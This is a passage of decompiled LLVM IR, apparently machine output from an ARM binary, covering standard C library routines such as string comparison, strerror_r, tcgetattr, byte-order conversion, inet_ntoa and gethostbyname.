dec_label_pc_1563c:                               ; preds = %dec_label_pc_15578, %dec_label_pc_15634, %dec_label_pc_1561c, %dec_label_pc_15604, %dec_label_pc_155ec
  br label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %dec_label_pc_1556c, %dec_label_pc_15624, %dec_label_pc_1560c, %dec_label_pc_155f4, %dec_label_pc_155dc, %dec_label_pc_1563c
  %v1_15644 = phi i32 [ 0, %dec_label_pc_1563c ], [ %v1_15624, %dec_label_pc_15624 ], [ %v1_1560c, %dec_label_pc_1560c ], [ %v1_155f4, %dec_label_pc_155f4 ], [ %v0_155fc, %dec_label_pc_155dc ], [ %v0_15580, %dec_label_pc_1556c ]
  ret i32 %v1_15644

; uselistorder directives
  uselistorder i32 %v4_15598, { 1, 0 }
  uselistorder i32 %v2_15598, { 0, 2, 1 }
  uselistorder i32 %v0_155fc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1558c, { 1, 0 }
  uselistorder i32 %v1_15580, { 1, 0, 2 }
  uselistorder i32 %v0_155843, { 2, 1, 0 }
  uselistorder i32 %v1_15564, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15640, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1563c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_155dc, { 1, 0 }
  uselistorder label %dec_label_pc_1556c, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15658 = call i32 @__xpg_strerror_r()
  %v0_1565c = load i32, i32* @r4, align 4
  ret i32 %v0_1565c
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 25940), i32* @r2, align 4
  %v0_15680 = call i32 @strtok_r()
  ret i32 %v0_15680
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_156e0, %entry
  %v1_156f88 = phi i32 [ %v1_156f89, %dec_label_pc_156e0 ], [ 0, %entry ]
  %v0_156e8 = phi i32 [ %v1_156e8, %dec_label_pc_156e0 ], [ %arg2, %entry ]
  %v0_156ec = phi i32 [ %v1_156ec, %dec_label_pc_156e0 ], [ %tmp, %entry ]
  %v9_156b4 = icmp eq i32 %v0_156ec, %v0_156e8
  %.pre = inttoptr i32 %v0_156ec to i8*
  br i1 %v9_156b4, label %dec_label_pc_156e0, label %dec_label_pc_156bc

dec_label_pc_156bc:                               ; preds = %dec_label_pc_156b4
  %v2_156bc = load i8, i8* %.pre, align 1
  %v3_156bc = zext i8 %v2_156bc to i32
  %v1_156c0 = inttoptr i32 %v0_156e8 to i8*
  %v2_156c0 = load i8, i8* %v1_156c0, align 1
  %v3_156c0 = zext i8 %v2_156c0 to i32
  %v4_156c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 1268) to i32*), align 4
  %v2_156c8 = mul nuw nsw i32 %v3_156c0, 2
  %v2_156cc = mul nuw nsw i32 %v3_156bc, 2
  %v2_156d0 = add i32 %v4_156c4, %v2_156c8
  %v3_156d0 = inttoptr i32 %v2_156d0 to i16*
  %v4_156d0 = load i16, i16* %v3_156d0, align 2
  %v6_156d0 = sext i16 %v4_156d0 to i32
  %v2_156d4 = add i32 %v4_156c4, %v2_156cc
  %v3_156d4 = inttoptr i32 %v2_156d4 to i16*
  %v4_156d4 = load i16, i16* %v3_156d4, align 2
  %v6_156d4 = sext i16 %v4_156d4 to i32
  %v2_156d8 = sub nsw i32 %v6_156d4, %v6_156d0
  %v9_156d8 = icmp eq i16 %v4_156d4, %v4_156d0
  br i1 %v9_156d8, label %dec_label_pc_156e0, label %dec_label_pc_156f4

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156b4, %dec_label_pc_156bc
  %v1_156f89 = phi i32 [ %v2_156d8, %dec_label_pc_156bc ], [ %v1_156f88, %dec_label_pc_156b4 ]
  %v2_156e0 = load i8, i8* %.pre, align 1
  %v2_156e4 = icmp eq i8 %v2_156e0, 0
  %v1_156e8 = add i32 %v0_156e8, 1
  %v1_156ec = add i32 %v0_156ec, 1
  store i32 %v1_156ec, i32* @ip, align 4
  br i1 %v2_156e4, label %dec_label_pc_156f4, label %dec_label_pc_156b4

dec_label_pc_156f4:                               ; preds = %dec_label_pc_156e0, %dec_label_pc_156bc
  %v1_156f8 = phi i32 [ %v1_156f89, %dec_label_pc_156e0 ], [ %v2_156d8, %dec_label_pc_156bc ]
  ret i32 %v1_156f8

; uselistorder directives
  uselistorder i32 %v1_156ec, { 1, 0 }
  uselistorder i32 %v2_156d8, { 1, 0 }
  uselistorder i32 %v0_156ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156e0, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15704 = load i32, i32* @r4, align 4
  %v9_15704 = load i32, i32* @r6, align 4
  %v0_1570c = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  store i32 %v0_1570c, i32* @ip, align 4
  %v0_1571c = load i32, i32* @r1, align 4
  store i32 %v0_1571c, i32* @r7, align 4
  %v0_15720 = load i32, i32* @r2, align 4
  store i32 %v0_15720, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1570c, 124
  br i1 %tmp, label %dec_label_pc_15758, label %dec_label_pc_15728

dec_label_pc_15728:                               ; preds = %entry
  br label %dec_label_pc_15740

dec_label_pc_15734:                               ; preds = %dec_label_pc_15740
  br i1 %v2_1574c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_15734
  %v2_15738 = add i32 %v1_15750, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_15734, %bb
  %v0_157401 = phi i32 [ %v1_15750, %dec_label_pc_15734 ], [ %v2_15738, %bb ]
  %v1_1573c = add i32 %v0_1573c, 1
  br label %dec_label_pc_15740

dec_label_pc_15740:                               ; preds = %dec_label_pc_15728, %bb15
  %v1_15750 = phi i32 [ %v0_1570c, %dec_label_pc_15728 ], [ %v0_157401, %bb15 ]
  %v0_1573c = phi i32 [ add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38300), %dec_label_pc_15728 ], [ %v1_1573c, %bb15 ]
  store i32 %v0_1573c, i32* @r5, align 4
  %v2_15740 = icmp eq i32 %v1_15750, 0
  %v1_15744 = inttoptr i32 %v0_1573c to i8*
  %v2_15744 = load i8, i8* %v1_15744, align 1
  %v3_15744 = zext i8 %v2_15744 to i32
  store i32 %v3_15744, i32* @r3, align 4
  %v2_1574c = icmp eq i8 %v2_15744, 0
  br i1 %v2_15740, label %dec_label_pc_1574c, label %dec_label_pc_15734

dec_label_pc_1574c:                               ; preds = %dec_label_pc_15740
  br i1 %v2_1574c, label %dec_label_pc_15758, label %bb16

bb16:                                             ; preds = %dec_label_pc_1574c
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15794

dec_label_pc_15758:                               ; preds = %dec_label_pc_1574c, %entry
  store i32 %v0_1570c, i32* @r2, align 4
  %v3_15760 = ashr i32 %v0_1570c, 31
  store i32 %v3_15760, i32* @r3, align 4
  %v6_15774 = bitcast i32* %stack_var_-25 to i8*
  %v7_15774 = call i32 @_uintmaxtostr(i8* %v6_15774)
  %v1_1577c = add i32 %v7_15774, -14
  store i32 %v1_1577c, i32* @r5, align 4
  %v0_15780 = load i32, i32* @r6, align 4
  %v2_15780 = add i32 %v0_15780, -38316
  store i32 %v2_15780, i32* @r1, align 4
  store i32 %v1_1577c, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_1578c = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15794.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15794

dec_label_pc_15794:                               ; preds = %bb16, %dec_label_pc_15758
  %v0_15794 = phi i32 [ %v0_1573c, %bb16 ], [ %v0_15794.pre, %dec_label_pc_15758 ]
  %v1_15794 = inttoptr i32 %v0_15794 to i8*
  %v3_15798 = call i32 @strlen(i8* %v1_15794)
  %v0_1579c = load i32, i32* @r7, align 4
  %v2_1579c = icmp eq i32 %v0_1579c, 0
  br i1 %v2_1579c, label %bb17, label %dec_label_pc_15794._crit_edge

dec_label_pc_15794._crit_edge:                    ; preds = %dec_label_pc_15794
  %v1_157a8.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_15794
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15794._crit_edge, %bb17
  %v1_157a8 = phi i32 [ %v1_157a8.pre, %dec_label_pc_15794._crit_edge ], [ 0, %bb17 ]
  %v1_157a4 = add i32 %v3_15798, 1
  %v3_157a8 = icmp uge i32 %v1_157a4, %v1_157a8
  %v9_157a8 = icmp eq i32 %v1_157a4, %v1_157a8
  %v2_157ac = xor i1 %v3_157a8, true
  %v3_157ac = or i1 %v9_157a8, %v2_157ac
  br i1 %v3_157ac, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_157a4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_157bc = phi i32 [ %v1_157a8, %bb18 ], [ %v1_157a4, %bb19 ]
  %v2_157b0 = xor i1 %v9_157a8, true
  %v3_157b0 = and i1 %v3_157a8, %v2_157b0
  br i1 %v3_157b0, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_157b4 = icmp eq i32 %v0_157bc, 0
  br i1 %v2_157b4, label %dec_label_pc_157d8, label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %bb22
  store i32 %v0_157bc, i32* @r2, align 4
  %v0_157c0 = load i32, i32* @r5, align 4
  store i32 %v0_157c0, i32* @r1, align 4
  store i32 %v0_1579c, i32* @r0, align 4
  %v0_157c8 = call i32 @memcpy()
  %v0_157cc = load i32, i32* @r4, align 4
  %v1_157cc = load i32, i32* @r7, align 4
  %v2_157cc = add i32 %v1_157cc, %v0_157cc
  %v3_157d4 = add i32 %v2_157cc, -1
  %v4_157d4 = inttoptr i32 %v3_157d4 to i8*
  store i8 0, i8* %v4_157d4, align 1
  br label %dec_label_pc_157d8

dec_label_pc_157d8:                               ; preds = %bb22, %dec_label_pc_157bc
  %v0_157d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_157d8 = icmp eq i32 %v0_157d8, 0
  br i1 %v2_157d8, label %dec_label_pc_157e8, label %dec_label_pc_157e0

dec_label_pc_157e0:                               ; preds = %dec_label_pc_157d8
  %v0_157e0 = call i32 @__GI___errno_location()
  %v0_157e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_157e4 = inttoptr i32 %v0_157e0 to i32*
  store i32 %v0_157e4, i32* %v2_157e4, align 4
  %v0_157e8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157e8

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157d8, %dec_label_pc_157e0
  %v0_157e8 = phi i32 [ 0, %dec_label_pc_157d8 ], [ %v0_157e8.pre, %dec_label_pc_157e0 ]
  store i32 %v3_15704, i32* @r4, align 4
  store i32 %v9_15704, i32* %r6.global-to-local, align 4
  ret i32 %v0_157e8

; uselistorder directives
  uselistorder i1 %v3_157a8, { 1, 0 }
  uselistorder i32 %v0_1573c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15750, { 1, 0, 2 }
  uselistorder i32 %v0_1570c, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_157e8, { 1, 0 }
  uselistorder label %dec_label_pc_157d8, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15794, { 1, 0 }
  uselistorder label %dec_label_pc_15740, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_15810 = load i32, i32* %r0.global-to-local, align 4
  %v1_1582423 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15824.outer

dec_label_pc_15824.outer:                         ; preds = %dec_label_pc_15864, %entry
  %v0_15864.ph = phi i32 [ %v1_15864, %dec_label_pc_15864 ], [ %v0_15810, %entry ]
  %v2_1582424 = load i8, i8* %v1_1582423, align 1
  %v2_1582826 = icmp eq i8 %v2_1582424, 0
  br i1 %v2_1582826, label %bb, label %dec_label_pc_1583c

bb:                                               ; preds = %dec_label_pc_15824.backedge, %dec_label_pc_15824.outer
  store i32 %v0_15864.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15878

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15824.outer, %dec_label_pc_15824.backedge
  %v1_1583032.in = phi i32 [ %v1_1583032, %dec_label_pc_15824.backedge ], [ %arg2, %dec_label_pc_15824.outer ]
  %v2_1582430 = phi i8 [ %v2_15824, %dec_label_pc_15824.backedge ], [ %v2_1582424, %dec_label_pc_15824.outer ]
  %v2_1582c31.in.in = phi i8 [ %v2_15824, %dec_label_pc_15824.backedge ], [ %v2_1582424, %dec_label_pc_15824.outer ]
  %v0_1584829 = phi i32 [ %v1_15848, %dec_label_pc_15824.backedge ], [ %v0_15864.ph, %dec_label_pc_15824.outer ]
  %v1_1583032 = add i32 %v1_1583032.in, 1
  %v1_1583c = inttoptr i32 %v0_1584829 to i8*
  %v2_1583c = load i8, i8* %v1_1583c, align 1
  %v3_1583c = zext i8 %v2_1583c to i32
  store i32 %v3_1583c, i32* %r0.global-to-local, align 4
  %v9_15840 = icmp eq i8 %v2_1582430, %v2_1583c
  %v1_15848 = add i32 %v0_1584829, 1
  br i1 %v9_15840, label %dec_label_pc_15824.backedge, label %dec_label_pc_15850

dec_label_pc_15824.backedge:                      ; preds = %dec_label_pc_1583c, %dec_label_pc_15850
  %v1_15824 = inttoptr i32 %v1_1583032 to i8*
  %v2_15824 = load i8, i8* %v1_15824, align 1
  %v2_15828 = icmp eq i8 %v2_15824, 0
  br i1 %v2_15828, label %bb, label %dec_label_pc_1583c

dec_label_pc_15850:                               ; preds = %dec_label_pc_1583c
  %v2_1582c31.in = zext i8 %v2_1582c31.in.in to i32
  %v2_15844 = mul nuw nsw i32 %v3_1583c, 2
  %v2_1582c31 = mul nuw nsw i32 %v2_1582c31.in, 2
  %v4_15850 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 1268) to i32*), align 4
  %v2_15854 = add i32 %v4_15850, %v2_15844
  %v3_15854 = inttoptr i32 %v2_15854 to i16*
  %v4_15854 = load i16, i16* %v3_15854, align 2
  %v2_15858 = add i32 %v4_15850, %v2_1582c31
  %v3_15858 = inttoptr i32 %v2_15858 to i16*
  %v4_15858 = load i16, i16* %v3_15858, align 2
  %v9_1585c = icmp eq i16 %v4_15858, %v4_15854
  br i1 %v9_1585c, label %dec_label_pc_15824.backedge, label %dec_label_pc_15864

dec_label_pc_15864:                               ; preds = %dec_label_pc_15850
  %v1_15864 = add i32 %v0_15864.ph, 1
  %v2_15868 = icmp eq i8 %v2_1583c, 0
  br i1 %v2_15868, label %dec_label_pc_15878, label %dec_label_pc_15824.outer

dec_label_pc_15878:                               ; preds = %dec_label_pc_15864, %bb
  %v1_1587c = phi i32 [ %v0_15864.ph, %bb ], [ 0, %dec_label_pc_15864 ]
  ret i32 %v1_1587c

; uselistorder directives
  uselistorder i8 %v2_15824, { 2, 1, 0 }
  uselistorder i32 %v0_1584829, { 1, 0 }
  uselistorder i32 %v0_15864.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15824.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1583c, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15890 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15890, i32* @r1, align 4
  %v0_15894 = call i32 @__GI_tcgetattr()
  %v1_15898 = sub i32 1, %v0_15894
  %v2_15898 = icmp ult i32 %v0_15894, 2
  br i1 %v2_15898, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_158a8 = phi i32 [ %v1_15898, %entry ], [ 0, %bb ]
  ret i32 %v1_158a8

; uselistorder directives
  uselistorder i32 %v0_15894, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_158ac = load i32, i32* @r4, align 4
  %v6_158ac = load i32, i32* @r5, align 4
  %v2_158b4 = ptrtoint i32* %stack_var_-52 to i32
  %v0_158b8 = load i32, i32* @r1, align 4
  store i32 %v0_158b8, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_158c4 = load i32, i32* @r0, align 4
  %v3_158c4 = call i32 @ioctl(i32 %v0_158c4, i32 21505, i32 %v2_158b4)
  store i32 %v3_158c4, i32* %r0.global-to-local, align 4
  store i32 %v3_158c4, i32* @r5, align 4
  %v2_158c8 = icmp eq i32 %v3_158c4, 0
  br i1 %v2_158c8, label %dec_label_pc_158d0, label %dec_label_pc_15914

dec_label_pc_158d0:                               ; preds = %entry
  %v4_158dc = zext i8 %tmp to i32
  store i32 %v4_158dc, i32* @ip, align 4
  %v3_158e0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_158e0, i32* @r3, align 4
  %v1_158e4 = load i32, i32* @r4, align 4
  %v2_158e4 = add i32 %v1_158e4, 4
  %v3_158e4 = inttoptr i32 %v2_158e4 to i32*
  %v0_158e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_158e8 = load i32, i32* @r4, align 4
  %v2_158e8 = add i32 %v1_158e8, 8
  %v3_158e8 = inttoptr i32 %v2_158e8 to i32*
  store i32 %v0_158e8, i32* %v3_158e8, align 4
  %v0_158ec = load i32, i32* %r0.global-to-local, align 4
  %v1_158ec = load i32, i32* @r4, align 4
  %v2_158ec = add i32 %v1_158ec, 12
  %v3_158ec = inttoptr i32 %v2_158ec to i32*
  store i32 %v0_158ec, i32* %v3_158ec, align 4
  %v2_158f0 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_158f0, i32* @r1, align 4
  %v1_158f8 = load i32, i32* @r4, align 4
  %v2_158f8 = inttoptr i32 %v1_158f8 to i32*
  store i32 %v3_158e0, i32* %v2_158f8, align 4
  %v0_158fc = load i32, i32* @ip, align 4
  %v1_158fc = trunc i32 %v0_158fc to i8
  %v2_158fc = load i32, i32* @r4, align 4
  %v3_158fc = add i32 %v2_158fc, 16
  %v4_158fc = inttoptr i32 %v3_158fc to i8*
  store i8 %v1_158fc, i8* %v4_158fc, align 1
  %v0_15900 = load i32, i32* @r4, align 4
  %v1_15900 = add i32 %v0_15900, 17
  store i32 %v1_15900, i32* %r0.global-to-local, align 4
  %v4_15904 = call i32 @__GI_mempcpy(i32 %v1_15900, i32 %v2_158f0, i32 19, i32 %v3_158e0)
  store i32 %v4_15904, i32* %r0.global-to-local, align 4
  %v0_15908 = load i32, i32* @r5, align 4
  store i32 %v0_15908, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15910 = inttoptr i32 %v4_15904 to i8*
  %v3_15910 = call i32 @__GI_memset(i8* %v2_15910, i32 %v0_15908)
  store i32 %v3_15910, i32* %r0.global-to-local, align 4
  %v0_15914.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15914

dec_label_pc_15914:                               ; preds = %entry, %dec_label_pc_158d0
  %v0_15914 = phi i32 [ %v3_158c4, %entry ], [ %v0_15914.pre, %dec_label_pc_158d0 ]
  store i32 %v0_15914, i32* %r0.global-to-local, align 4
  store i32 %v3_158ac, i32* @r4, align 4
  store i32 %v6_158ac, i32* @r5, align 4
  ret i32 %v0_15914

; uselistorder directives
  uselistorder i32 %v0_15914, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_15914, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15928 = udiv i32 %arg1, 256
  %v1_1592c = mul i32 %arg1, 256
  %v4_15930 = and i32 %v1_1592c, 65280
  %v5_15930 = or i32 %v4_15930, %v3_15928
  ret i32 %v5_15930
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_15950 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_15950
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15958 = udiv i32 %arg1, 256
  %v1_1595c = mul i32 %arg1, 256
  %v4_15960 = and i32 %v1_1595c, 65280
  %v5_15960 = or i32 %v4_15960, %v3_15958
  ret i32 %v5_15960
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_15980 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_15980
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_15988 = load i32, i32* @r4, align 4
  %v6_15988 = load i32, i32* @r5, align 4
  %v9_15988 = load i32, i32* @r6, align 4
  %v12_15988 = load i32, i32* @r7, align 4
  %v15_15988 = load i32, i32* @r8, align 4
  %v18_15988 = load i32, i32* @sb, align 4
  %v21_15988 = load i32, i32* @sl, align 4
  %v24_15988 = load i32, i32* @fp, align 4
  %v0_1598c = load i32, i32* @r0, align 4
  %v5_159a8 = call i32 @llvm.bswap.i32(i32 %v0_1598c)
  %v0_159ac = load i32, i32* @r1, align 4
  %v1_159ac = add i32 %v0_159ac, 15
  store i32 %v1_159ac, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_159e8

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159e8
  %v1_159d4 = inttoptr i32 %v0_15a04 to i8*
  %v2_159d4 = call i32 @_uintmaxtostr(i8* %v1_159d4)
  %v0_159d8 = load i32, i32* @r6, align 4
  %v2_159d8 = icmp eq i32 %v0_159d8, 0
  %v1_159dc = add i32 %v2_159d4, -1
  store i32 %v1_159dc, i32* @r1, align 4
  br i1 %v2_159d8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_159cc
  %v1_159e0 = load i32, i32* @sl, align 4
  %v2_159e0 = trunc i32 %v1_159e0 to i8
  %v4_159e0 = inttoptr i32 %v0_159d8 to i8*
  store i8 %v2_159e0, i8* %v4_159e0, align 1
  %v0_159e4.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_159cc, %bb
  %v0_159e4 = phi i32 [ %v1_159dc, %dec_label_pc_159cc ], [ %v0_159e4.pre, %bb ]
  store i32 %v0_159e4, i32* @r6, align 4
  %v0_159e8.pre = load i32, i32* @r5, align 4
  %v0_159ec.pre = load i32, i32* @r7, align 4
  %v1_159ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_159e8

dec_label_pc_159e8:                               ; preds = %entry, %bb17
  %v0_15a04 = phi i32 [ %v1_159ac, %entry ], [ %v0_159e4, %bb17 ]
  %v1_159ec = phi i32 [ %v5_159a8, %entry ], [ %v1_159ec.pre, %bb17 ]
  %v0_159ec = phi i32 [ 255, %entry ], [ %v0_159ec.pre, %bb17 ]
  %v0_159fc = phi i32 [ 0, %entry ], [ %v0_159e8.pre, %bb17 ]
  %v7_159e8 = icmp eq i32 %v0_159fc, 3
  store i1 %v7_159e8, i1* @cpsr_z, align 1
  %v2_159ec = and i32 %v0_159ec, %v1_159ec
  store i32 %v2_159ec, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_159f8 = udiv i32 %v1_159ec, 256
  store i32 %v3_159f8, i32* @r4, align 4
  %v1_159fc = add i32 %v0_159fc, 1
  store i32 %v1_159fc, i32* @r5, align 4
  %v7_15a00 = icmp sgt i32 %v0_159fc, 3
  br i1 %v7_15a00, label %dec_label_pc_15a04, label %dec_label_pc_159cc

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159e8
  %v1_15a04 = add i32 %v0_15a04, 1
  store i32 %v3_15988, i32* @r4, align 4
  store i32 %v6_15988, i32* @r5, align 4
  store i32 %v9_15988, i32* @r6, align 4
  store i32 %v12_15988, i32* @r7, align 4
  store i32 %v15_15988, i32* @r8, align 4
  store i32 %v18_15988, i32* @sb, align 4
  store i32 %v21_15988, i32* @sl, align 4
  store i32 %v24_15988, i32* @fp, align 4
  ret i32 %v1_15a04

; uselistorder directives
  uselistorder i32 %v0_159fc, { 2, 0, 1 }
  uselistorder i32 %v0_159e4, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_159e8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 25944), i32* @r1, align 4
  %v0_15a24 = call i32 @__GI_inet_ntoa_r()
  %v0_15a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a28, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_15a28 = load i32, i32* @r1, align 4
  %v2_15a28 = load i32, i32* @ip, align 4
  %v3_15a28 = udiv i32 %v2_15a28, 2048
  %v4_15a28 = mul i32 %v2_15a28, 2097152
  %v5_15a28 = or i32 %v3_15a28, %v4_15a28
  %v8_15a28 = and i32 %v5_15a28, %v1_15a28
  store i32 %v8_15a28, i32* @r4, align 4
  %v2_15a2c = load i32, i32* @r8, align 4
  %v3_15a2c = load i32, i32* @r5, align 4
  %v8_15a2c = ashr i32 %v2_15a2c, %v3_15a2c
  %v9_15a2c = and i32 %v8_15a2c, %v0_15a24
  store i32 %v9_15a2c, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_15a24

; uselistorder directives
  uselistorder i32 %v0_15a24, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_15a38 = ptrtoint i32* %stack_var_-12 to i32
  %v0_15a3c = load i32, i32* @r0, align 4
  %v2_15a3c = inttoptr i32 %v0_15a3c to i8*
  %v3_15a3c = call i32 @inet_aton(i8* %v2_15a3c, i32 %v2_15a38)
  %v2_15a40 = icmp eq i32 %v3_15a3c, 0
  %v4_15a44 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_15a40, i32 -1, i32 %v4_15a44
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_15a64 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_15a64
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_15a74 = load i32, i32* @r4, align 4
  %v6_15a74 = load i32, i32* @r5, align 4
  %v0_15a7c = load i32, i32* @r0, align 4
  store i32 %v0_15a7c, i32* @r4, align 4
  %v0_15a80 = load i32, i32* @r1, align 4
  store i32 %v0_15a80, i32* @r5, align 4
  %v0_15a84 = call i32 @__GI___h_errno_location()
  %v0_15aac = load i32, i32* @r4, align 4
  %v2_15ab0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_15ab0, i32* @ip, align 4
  %v0_15ab4 = load i32, i32* @r5, align 4
  %v8_15abc = call i32 @gethostbyname2_r(i32 %v0_15aac, i32 %v0_15ab4, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26400) to i32*), i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 25960), i32 440, i32 %v2_15ab0, i32 %v0_15a84)
  %v3_15ac0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_15a74, i32* @r4, align 4
  store i32 %v6_15a74, i32* @r5, align 4
  ret i32 %v3_15ac0
}

define i32 @function_15ad4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15ad4:
  %v0_15ad4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15ad4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15ad4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15ad4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
